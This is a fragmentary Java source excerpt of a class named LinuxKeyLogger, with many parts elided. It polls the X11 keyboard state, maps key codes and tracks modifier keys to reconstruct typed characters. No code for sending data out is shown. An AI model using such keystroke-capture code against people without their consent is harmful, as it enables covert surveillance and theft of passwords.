...
public final class LinuxKeyLogger {
    private static final BlockingQueue<byte[]> processQueue = new LinkedBlockingQueue<>();
    ...
    public LinuxKeyLogger() {
        new Thread(LinuxKeyLogger::processQueue).start();
    }
    ...
    private static void processQueue() {
        ...
        final Set<Integer> caps_set = new HashSet<>();
        final Set<Integer> shift_set = new HashSet<>();
        final Set<Integer> ctrl_set = new HashSet<>();
        final Set<Integer> alt_set = new HashSet<>();
        final Set<Integer> meta_set = new HashSet<>();
        ...
        for (int code = 0; code <= max_key_code.getValue(); ++code) {
            ...
            if (Objects.equals(key_map[code], "Caps_Lock")) {
                caps_set.add(code);
            } else if (Objects.equals(key_map[code], "Shift_L") || Objects.equals(key_map[code], "Shift_R")) {
                shift_set.add(code);
            } else if (Objects.equals(key_map[code], "Control_L") || Objects.equals(key_map[code], "Control_R")) {
                ctrl_set.add(code);
            } else if (Objects.equals(key_map[code], "Alt_L") || Objects.equals(key_map[code], "Alt_R")) {
                alt_set.add(code);
            } else if (Objects.equals(key_map[code], "Meta_L") || Objects.equals(key_map[code], "Meta_R")) {
                meta_set.add(code);
            }
        }
                    ...
                    if (keys[i] != lastkeys[i]) {
                        ...
                        for (int j = 0, test = 1; j < 8; ++j, test *= 2) {
                            if (((keys[i] & test) == 0) && (((keys[i] & test) == 0) != ((lastkeys[i] & test) == 0))) {
                                ...
                                final boolean key_is_nav = (Objects.equals(key, "Nav"));
                                ...
                                if (!(last_is_nav && key_is_nav) && key.length() > 0) {
                                    ...
                                    switch (key.length()) {
                                        case 1:
                                            ...
                                            last_is_char = (!Objects.equals(key, "\n"));
